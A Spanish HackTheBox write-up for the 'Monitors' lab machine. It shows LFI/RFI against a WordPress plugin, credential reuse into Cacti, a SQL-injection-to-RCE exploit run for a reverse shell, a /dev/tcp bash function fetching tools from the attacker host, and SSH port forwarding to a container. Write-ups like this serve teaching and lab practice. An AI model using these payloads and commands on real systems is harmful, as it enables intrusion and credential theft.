---
layout      : post
title       : "HackTheBox - Monitors"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341banner.png
category    : [ htb ]
tags        : [ capabilities, docker, wp-with-spritz, LFI, RFI, Apache-OFBiz, deserialization ]
---
M√°quina Linux nivel dif√≠cil. Tendremos muuuuchos **CVEs**, jugaremos con inclusi√≥n remota/local de archivos en un plugin de **WordPress** (**wp-with-spritz**), reutilizaci√≥n de contrase√±as, ejecuci√≥n remota de comandos en un **Cactus** (?), movimientos sensuales con deserializaciones inseguras en **Apache OFBiz** y saldremos üèÉ‚Äç‚ôÇÔ∏è (corriendo) de un contenedor con ayuda de una **capability** (**cap_sys_module**), crearemos un m√≥dulo en el kernel para ejecutar comandos remotamente desde el **host** (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341monitorsHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

### TL;DR (Spanish writeup)

**Creada por**: [TheCyberGeek](https://www.hackthebox.eu/profile/114053).

Vamos a juntarnos con las realezas...

Empezaremos enumerando un servidor web ejecutado sobre `Apache` que esta sirviendo el **CMS WordPress**, profundizando un poquito encontraremos que esta ejecutando un plugin (`wp-with-spritz`), buscando en la web veremos que hay una versi√≥n vulnerable a **inclusi√≥n de archivos** tanto *remota* (**RFI**) como *local* (**LFI**), jugando con ella veremos que nuestra versi√≥n del plugin es vulnerable.

Esto nos permitir√° enumerar muuuuchos archivos, pero principalmente encontraremos el archivo de configuraci√≥n de base de datos en **WordPress** (`wp-config.php`) (que contiene credenciales de un user para la DB) yyyy los archivos de configuraci√≥n de **Apache**, entre ellos el que contiene la conf por default de **Virtual Host**, `000-default.conf`. En su contenido encontraremos la info que encontramos al iniciar el servidor web, peeeero adem√°s tendremos un nuevo dominio.

Jugando con ese dominio encontraremos una nueva app, `Cacti` en su versi√≥n `1.2.12`, enumerando encontraremos una vulnerabilidad que nos permite ejecutar comandos remotamente, pero tendremos que estar autenticados para eso. Jugando con las credenciales encontradas anteriormente lograremos acceder y finalmente conseguir **RCE**, obtendremos una **Reverse Shell** como el usuario `www-data`.

Tendremos al usuario `marcus`, en su directorio habr√° una carpeta llamada `.backup`, pero no tendremos posibilidad de listar si hay o no contenido en ella. En el sistema encontraremos un archivo de servicio (`.service`) que llama un script, en el script veremos que efect√∫a un backup de los archivos usados por **Cacti**, pero para generarlo hace una autenticaci√≥n, y las credenciales con la que lo hace estar√°n en el script, con esa contrase√±a lograremos obtener una sesi√≥n como el usuario `marcus`.

Estando como √©l, veremos que hay un contenedor activo en el puerto `8443`, tendremos que jugar con **port-forwarding** para que nos replique ese puerto en **nuestro** puerto **8443**, veremos que es un servidor web `Apache Tomcat`, fuzzeando su contenido tendremos algunos recursos a la mano, al dirigirnos a alguno nos redirecciona a un **login panel** de un servicio llamado `Apache OFBiz` en su versi√≥n `17.12.1`. Buscando en internet, caeremos en dos **CVEs** para esa versi√≥n, las dos hacen referencia a una **deserializaci√≥n insegura** que puede terminar en **ejecuci√≥n remota de comandos**, jugaremos con los 2 (**<u>ser√° muuuuy importante "fallar" con el primero para lograr ejecutar correctamente el otro CVE</u>**), pero el segundo (**CVE-2021-30128**) ser√° el que nos permitir√° obtener una **Reverse Shell** en el contenedor como `root`.

D√°ndole vueltas al contenedor, nos encontraremos con una **capability** bastante interesante (`cap_sys_module`) que nos permitir√° <u>cargar un m√≥dulo en el kernel</u> del **host** que generara **RCE**. Con esto obtendremos una **Reverse Shell** como el usuario `root` pero en este caso del sistema host (:

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 20%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>

Bastantes vulnerabilidades conocidas, as√≠ mismo llevada a la realidad.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

Compartimento.

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Enumeramos el servidor web (puerto 80)](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [Encontramos plugin de **WordPress** vulnerable a **LFI** y **RFI**](#wp-plugin-spritz-lfi-rfi).
  * [Obtenemos nuevo dominio buscando en archivos de **Apache2**](#lfi-apache-confiles).
  * [Jugamos con el nuevo dominio (servicio web *Cacti*)](#playing-with-cacti).
4. [Movimiento lateral: Vamos de **www-data** -> **marcus**](#www-data-marcus-backup).
  * [Encontramos contrase√±a de *marcus*](#backupscript-creds-marcus).
5. [Movimiento lateral: Vamos de **marcus** -> **contenedor**](#marcus-docker).
  * [Port-Fortwarding contra el contenedor del puerto **8443** (**Apache OFBiz**)](#fortwarding-docker-8443).
  * [**CVE-2021-26295** - No del todo Fail](#cve-2021-26295).
  * [**CVE-2021-30128** - **RCE** contra el container](#cve-2021-30128).
6. [Vamos del container al host (**cap_sys_module**)](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Como siempre, empezaremos buscando que puertos est√°n abiertos en la m√°quina, lo haremos con ayuda de **nmap**:

```bash
‚ù± nmap -p- --open -v 10.10.10.238 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos devuelve:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Tue Jul  6 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.238
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.238 () Status: Up
Host: 10.10.10.238 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Tue Jul  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 97.23 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos da la posibilidad de obtener una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web. |

Ya conociendo los puertos abiertos, haremos otro escaneo, pero esta vez buscaremos que versiones y scripts est√°n relacionados con cada puerto:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno**

```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.238
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80 -sC -sV 10.10.10.238 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos devuelve:

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Tue Jul  6 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.238
Nmap scan report for 10.10.10.238
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.40 seconds
```

Destacamos:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | Apache httpd 2.4.29

Por ahora no obtenemos m√°s info, as√≠ que profundicemos y veamos por donde romper la m√°quina (:

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Recorremos el puerto 80 [üìå](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80_fail.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos regala 2 datos:

1. Al parecer debemos agregar el dominio `monitors.htb` al [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html), ya que no permite acceder directamente con la **IP**.
2. Un correo: `admin@monitors.htb` del cual podemos extraer:
  * Un usuario llamado **admin**.
  * El dominio `monitors.htb`.

As√≠ que agreguemos el dominio al archivo `/etc/hosts`:

```bash
‚ù± cat /etc/hosts
...
10.10.10.238  monitors.htb
...
```

Y ahora veamos si cambia algo al dirigirnos al dominio en vez de la IP:

![341page80_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80_done.png)

Listones, un sitio para monitorear hardware "seriamente" e.e

Jugando con **whatweb** (o con la extensi√≥n **Wappalyzer**) vemos la versi√≥n del software que sostiene la web:

```bash
‚ù± whatweb http://monitors.htb
http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]     
```

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

...

## <u>WordPress plugin</u> vulnerable a <u>LFI</u> y <u>RFI</u> [üìå](#wp-plugin-spritz-lfi-rfi) {#wp-plugin-spritz-lfi-rfi}

Vemos varias tecnolog√≠as, d√°ndole vueltas a todas, caemos en `Wordpress 5.5.1`, si buscamos vulnerabilidades contra ella no encontramos nada relevante, peeeero si vemos el c√≥digo fuente de la web encontramos algo llamativo:

![341page80_sourceCode](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80_sourceCode.png)

La web hace uso de un plugin llamado `wp-with-spritz`, si lo buscamos en internet el primer resultado es este:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_wpWithSpritz.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Una vulnerabilidad que explota una [inclusi√≥n remota de archivos (**RFI**)](https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii), que nos permite enlazar objetos (archivos) de otros servidores dentro del servidor vulnerable...

* [WordPress Plugin WP with **Spritz 1.0** - Remote File Inclusion](https://www.exploit-db.com/exploits/44544).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_wpWithSpritz_poc.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

üìÅ ***`file_get_contents()`: This is going to just display the text within the file by reading the contents as a string, and will not interpret PHP code for execution. If the `LFI` is using this method, <u>you can only enumerate files on the filesystem</u>.*** [Exploiting PHP Based LFI](https://infinitelogins.com/2020/11/21/exploiting-php-based-lfi/)

Vemos la funci√≥n vulnerable y como se puede explotar, pues validemos si tenemos la versi√≥n del plugin vulnerable:

```bash
‚ù± curl -i http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php
HTTP/1.1 200 OK
Date: Tue, 06 Jul 2021 19:21:52 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Pues el archivo existe, veamos la explotaci√≥n:

```html
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80_plugin_spritz_LFI_etcPasswd.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Perfecto, tenemos un [**LFI** (inclusi√≥n de archivos locales)](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/), por lo que podemos ver objetos del sistema.

> Adem√°s vemos un usuario llamado **marcus**, guardemoslo por si algo.

El **RFI** tambi√©n nos da √©xito, para validarlo simplemente debemos levantar un servidor web:

```bash
‚ù± python3 -m http.server
```

Y ejecutar mediante el plugin:

```bash
‚ù± curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://10.10.14.146:8000/hola
```

En nuestro servidor recibimos la petici√≥n hacia el archivo `hola` (: As√≠ que contamos con un **LFI** y un **RFI**.

...

Teniendo en mente que estamos sobre un sitio mantenido por **WordPress**, podemos buscar que archivos maneja el **CMS** y as√≠ usar el **LFI** para ver su contenido:

* [Beginner‚Äôs Guide to Understanding WordPress File Structure & Database](https://www.malcare.com/blog/beginners-guide-to-understanding-the-structure-of-a-wordpress-site/).

Hay varios, pero debemos centrarnos en encontrar el archivo `wp-config.php` que por lo general contiene las credenciales de la base de datos y nos podr√≠an servir para hacer reutilizaci√≥n de contrase√±as o descubrir nuevos usuarios...

Jugando con el **LFI** movi√©ndonos entre carpetas, logramos encontrarlo:

```bash
‚ù± curl -s ...wp.spritz.content.filter.php?url=../../../../wp-config.php
```

```bash
‚ù± curl -s ...wp.spritz.content.filter.php?url=../../../wp-config.php
```

![341bash_LFI_wpconfigPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_LFI_wpconfigPHP.png)

Perfecto, vemos el usuario de la DB y su contrase√±a (:

Tom√°ndolas y valid√°ndolas contra **SSH** no logramos nada ni con **marcus** ni con **root**.

Como sabemos, estamos usando **WordPress**, pues validando las credenciales contra el login en `http://monitors.htb/wp-login.php` tampoco logramos acceder.

* Adem√°s corroboramos que el √∫nico usuario que existe es **admin**, ni **marcus** ni **wpadmin** son v√°lidos.

  Se corrobora ya que si intentamos con credenciales que no deber√≠an existir, la web nos devuelve **<u>Unknown username</u>**, pero si probamos con el usuario `admin` y cualquier contrase√±a, nos devuelve: **<u>Error: the password you entered for the username admin is incorrect.</u>**

***(Probando a cambiar el a√±o de la pw tampoco obtenemos acceso a nada)*** ‚òπÔ∏è

...

## Rebuscando con el <u>LFI</u> en archivos de <u>Apache2</u> [üìå](#lfi-apache-confiles) {#lfi-apache-confiles}

Jugando a encontrar archivos que pudieran contener algo valioso, ca√≠ en cuenta que el sitio esta corriendo sobre **Apache**, podr√≠amos (con ayuda de varios recursos) intentar leer las configuraciones que tenga el sitio:

* [Muestra los archivos necesarios para configurar un server en **apache2**](https://ubuntu.com/server/docs/web-servers-apache).
* [Habla de logs, pero referencia varios archivos usados por **apache2**](https://www.loggly.com/ultimate-guide/apache-logging-basics/).

Probando y leyendo con los que nos daban respuesta, llegamos al archivo que contiene los [virtual hosts](https://www.digitalocean.com/community/tutorials/como-configurar-virtual-host-de-apache-en-ubuntu-14-04-lts-es#paso-cuatro-%E2%80%94-crear-nuevos-archivos-virtual-host) por defecto de **apache2**:

```bash
/etc/apache2/sites-available/000-default.conf
```

Si listamos su contenido, recibimos una sorpresa:

![341bash_LFI_apache2_000defaultCONF](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_LFI_apache2_000defaultCONF.png)

Hay dos comentarios que hacen referencia a "a√±adir la configuraci√≥n del virtual host" sobre dos dominios (adem√°s vemos el mensaje que obtuvimos al ingresar por **IP** y no por dominio):

* `monitors.htb`.
* `cacti-admin.monitors.htb`.

Pues podemos probar a agregar ese nuevo dominio al archivo `/etc/hosts` y validar si nos da respuesta...

> Podemos comprobar la existencia de cada configuracion simplemente pasandole los archivos al **LFI**:
> ```bash
> ‚ù± curl -s ...wp.spritz.content.filter.php?url=/etc/apache2/sites-available/monitors.htb.conf
> ‚ù± curl -s ...wp.spritz.content.filter.php?url=/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
> ```
> Asi encontrariamos la raiz de archivos tanto de **WordPress** (`/var/www/wordpress`) como del nuevo recurso (`/usr/share/cacti`).

```bash
‚ù± cat /etc/hosts
...
10.10.10.238  monitors.htb cacti-admin.monitors.htb
...
```

Y validandooooooo:

![341page80cacti_login](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80cacti_login.png)

Perfect√≠simo, encontramos otro servicio aparentemente llamado [**Cacti**](https://es.wikipedia.org/wiki/Cacti) (que sirve para generar gr√°ficas en la red) con una versi√≥n `1.2.12`, pues a darlee machete!

...

## Jugando con el servicio web <u>Cacti</u> [üìå](#playing-with-cacti) {#playing-with-cacti}

Encontramos un login panel, probando las credenciales que tenemos logramos pasar la autenticaci√≥n usando:

```bash
admin:BestAdministrator@2020!
```

![341page80cacti_dashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page80cacti_dashboard.png)

Estando dentro volvemos a ver la versi√≥n, as√≠ que en una b√∫squeda r√°pida con ella encontramos a algo interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_google_cactiversion.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Es un exploit ([CVE-2020-14295](https://nvd.nist.gov/vuln/detail/CVE-2020-14295)) que se aprovecha de una **inyecci√≥n SQL** para obtener **ejecuci√≥n remota de comandos** gracias a la concatenaci√≥n de consultas y el cambio de configuraci√≥n dentro de la base de datos:

```html
...update+settings+set+value='touch+/tmp/sqli_from_rce;'+where+name='path_php_binary';--+-
```

Pues tomando el exploit:

* [**Cacti 1.2.12** - 'filter' SQL Injection / Remote Code Execution](https://www.exploit-db.com/exploits/49810).

Y viendo su contenido nos muestra que obtendremos una Reverse Shell, as√≠ que nos ponemos en escucha (`nc -lvp 4433`) y ejecutamos el script:

```bash
‚ù± python3 cactiSQLIrce.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.146 --lport 4433
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_nc_wwwdataRevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

VAMOOO, estamos dentro del sistema como el usuario **www-data** (:

Hacemos tratamiento de la TTY y seguimos.

```bash
$ script /dev/null -c bash
www-data@monitors:/usr/share/cacti/cacti$ [CTRL + Z]
```

```bash
‚ù± stty raw -echo; fg
reset
xterm
```

```bash
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
# Abre una terminal y ejecuta stty -a, ah√≠ obtienes estos valores:
www-data@monitors:/usr/share/cacti/cacti$ stty rows 43 columns 192 
```

...

# Vamos de <u>www-data</u> -> <u>marcus</u> [#](#www-data-marcus-backup) {#www-data-marcus-backup}

Buscando y buscando no llegamos a nada, intentando subir `pspy` para ver procesos internos o `linpeas.sh` para enumerar a profundidad, el sistema no nos deja, b√°sicamente porque ni **curl** ni **wget** est√°n instalados yyy **nc** me da errores al intentar subir los archivos por ah√≠...

As√≠ que ca√≠ en este thread para subir archivos sin usar ning√∫n de las tools anteriores, todo simplemente usando redirecciones y `/dev/tcp`:

* [Download a file using just **Bash** and nothing else (no **curl**, **wget**, **perl**, etc.)](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et#answer-421318)

Copiamos la funci√≥n:

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

La pegamos en la terminal y ya podr√≠amos hacer peticiones llamando a la funci√≥n `__curl` desde la l√≠nea de comandos, lindo lindo:

```bash
www-data@monitors:/tmp$ __curl http://10.10.14.146:8000/linpeas.sh > lin.sh    
www-data@monitors:/tmp$ __curl http://10.10.14.146:8000/pspy > pspy    
```

Pero con ninguna de las dos herramientas vemos algo √∫til :(

...

## Encontramos contrase√±a de <u>marcus</u> [üìå](#backupscript-creds-marcus) {#backupscript-creds-marcus}

Volviendo a enumerar cada servicio, sus archivos y contenido no hay nada llamativo a la vista (algunos tienen mucho c√≥digo), en este punto empece a jugar con `find` de nuevo, pero ahora buscando archivos escondidos, archivos que empezaran o terminaran con **marcus**, con **WordPress** y con **cacti**, con esta √∫ltima b√∫squeda encontramos algo interesante:

```bash
www-data@monitors:/tmp$ find / -name "cacti*" 2>/dev/null
/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service
/var/log/cacti-access.log
/var/log/cacti-error.log
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
/usr/share/cacti
/usr/share/cacti/cacti
...
# Todos los archivos del sitio web cacti
```

Viendo cada contenido, caemos en estos archivos de [servicio](https://www.digitalocean.com/community/tutorials/how-to-use-systemctl-to-manage-systemd-services-and-units-es):

```bash
/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service
```

Y observando el contenido del primero obtenemos:

```bash
www-data@monitors:/tmp$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```

Es un [servicio](https://www.digitalocean.com/community/tutorials/how-to-use-systemctl-to-manage-systemd-services-and-units-es) que ejecuta un backup del servidor web. Dentro llama al script que hace el backup, veamos si tenemos acceso a √©l:

```bash
www-data@monitors:/tmp$ ls -la /home/marcus/.backup/backup.sh
-r-xr-x--- 1 www-data www-data 259 Nov 10  2020 /home/marcus/.backup/backup.sh
```

Somos propietarios del script, pues veamos su contenido:

```bash
www-data@monitors:/tmp$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

Esta haciendo una transferencia de archivos, pero lo interesante esta en que la efect√∫a con credenciales, y en el propio script tenemos una contrase√±a:

```bash
...
config_pass="VerticalEdge2020"
...
```

Pues probando con ella ante el usuario **marcus** logramos obtener una sesi√≥n como √©l:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_wwwdataSH_SUmarcus.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Tamos dentro, medio feo, pero tamos.

> Podemos migrarnos a una sesion **SSH** con las mismas credenciales (:

...

# Vamos de <u>marcus</u> al <u>contenedor</u> [#](#marcus-docker) {#marcus-docker}

En el directorio `/home` de **marcus** hay una nota:

```bash
marcus@monitors:/tmp$ cat /home/marcus/note.txt 
TODO:

Disable phpinfo in php.ini  - DONE
Update docker image for production use  -    
```

Al admin le falto actualizar la imagen de **docker** para usarla en producci√≥n...

Jmmm, veamos si el servicio **docker** esta activo:

```bash
marcus@monitors:/tmp$ systemctl status docker
‚óè docker.service - Docker Application Container Engine
   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
   Active: active (running) since Wed 2021-07-07 05:49:31 UTC; 18h ago
     Docs: https://docs.docker.com
 Main PID: 1586 (dockerd)
    Tasks: 17
   CGroup: /system.slice/docker.service
           ‚îú‚îÄ1586 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
           ‚îî‚îÄ2033 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443

Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
```

Bien, esta activo y corriendo un contenedor con la IP **172.17.0.2** y el puerto **8443**, intentemos ver si nos responde una petici√≥n web:

```bash
marcus@monitors:/tmp$ __curl http://172.17.0.2:8443
Bad Request
This combination of host and port requires TLS.
marcus@monitors:/tmp$ __curl https://172.17.0.2:8443
Bad Request
This combination of host and port requires TLS.
```

F, no tenemos acceso al contenido, ya que no podemos hacer peticiones SSL con la funci√≥n `__curl`. Ac√° decid√≠ descargar el binario `curL` a mi m√°quina para posteriormente subirlo a la m√°quina, pues despu√©s de eso, conseguimos tener `curL` (el verdadero) en la m√°quina victima (:

```bash
marcus@monitors:/tmp/test$ __curl http://10.10.14.146:8000/curl > curl
marcus@monitors:/tmp/test$ chmod +x curl
marcus@monitors:/tmp/test$ ./curl 
curl: try 'curl --help' for more information
```

Con √©l podemos saltarnos la comprobaci√≥n que hace de **SSL**:

```bash
marcus@monitors:/tmp/test$ ./curl -k https://172.17.0.2:8443
```

![341bash_marcusSH_curl_docker](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_marcusSH_curl_docker.png)

Vemos que no encuentra nada al dirigirnos al recurso `/`, peeeero al final vemos la versi√≥n **9.0.31** de **Apache Tomcat**, perfecto.

> Despues de ver algunas vulnerabilidades relacionadas a esa version no encontramos nada llamativo.

...

## <u>Port-Fortwarding</u> contra el <u>contenedor docker</u> [üìå](#fortwarding-docker-8443) {#fortwarding-docker-8443}

Lo siguiente que podemos probar es hacer un **fuzzeo** a ver si encontramos nuevos recursos fuera de la vista. Pero claro, estamos muuuuy restringidos al estar en la m√°quina v√≠ctima (b√°sicamente porque no tiene las suficientes herramientas), as√≠ que hagamos un **port-forwarding** de ese puerto, as√≠ le indicamos que tome uno de nuestros puertos y lo replique como si fuera el puerto **8443** del servidor **172.17.0.2**, d√©mosle...

Intentando inicialmente con [chisel](https://github.com/jpillora/chisel) nos devuelve que el sistema no tiene permitido hacer **port-fortwarding**, haciendo otro intento, pero ahora con **SSH** vemos que si nos deja (:

* [How to Create SSH Tunneling or Port Forwarding in Linux](https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/).

> (Con `-N` le indicamos que no nos devuelva una terminal **SSH** y con `-f` le decimos que ejecute la tarea como secundaria, as√≠ no nos ocupa una terminal sin necesidad)

```bash
‚ù± ssh -N -f marcus@10.10.10.238 -L 8443:172.17.0.2:8443
```

Le indicamos que nos haga un **local-port-fortwarding** (porque estamos en la misma red que la m√°quina), lo que har√° `172.17.0.2:8443` es tomar ese puerto y asignarlo a nuestro puerto `8443`, nos pedir√° la contrase√±a de **marcus**, la colocamos y validamos que se haya realizado el fortwarding:

```bash
‚ù± lsof -i:8443
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ssh     474407 root    4u  IPv6 2061111      0t0  TCP localhost:8443 (LISTEN)
ssh     474407 root    5u  IPv4 2061112      0t0  TCP localhost:8443 (LISTEN)
```

> Para despu√©s terminar el fortwarding hacemos: `kill <PID>` y [mata el proceso](https://www.hostinger.co/tutoriales/cancelar-proceso-comando-kill-linux) asociado a ese PID.

Bien, perfect√≠simo, pues validemos que estamos corriendo en el puerto **8443** del localhost:

![341page8443localhost](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page8443localhost.png)

Lo que ya hab√≠amos visto, pues ahora si hagamos el fuzzeo:

```bash
‚ù± wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt https://localhost:8443/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000456:   302        0 L      0 W        0 Ch        "accounting"   
000000622:   302        0 L      0 W        0 Ch        "ap"
000000656:   302        0 L      0 W        0 Ch        "ar"
000000967:   302        0 L      0 W        0 Ch        "catalog"
000001141:   302        0 L      0 W        0 Ch        "common"
000001210:   302        0 L      0 W        0 Ch        "content"
000001548:   302        0 L      0 W        0 Ch        "ecommerce"
000001539:   302        0 L      0 W        0 Ch        "ebay"
000001673:   302        0 L      0 W        0 Ch        "example"
000002129:   302        0 L      0 W        0 Ch        "images"
000002569:   302        0 L      0 W        0 Ch        "marketing"
000002968:   302        0 L      0 W        0 Ch        "passport"
...
```

Vemos varias rutas, si intentamos direccionarnos hacia cualquiera, llegamos a esta p√°gina:

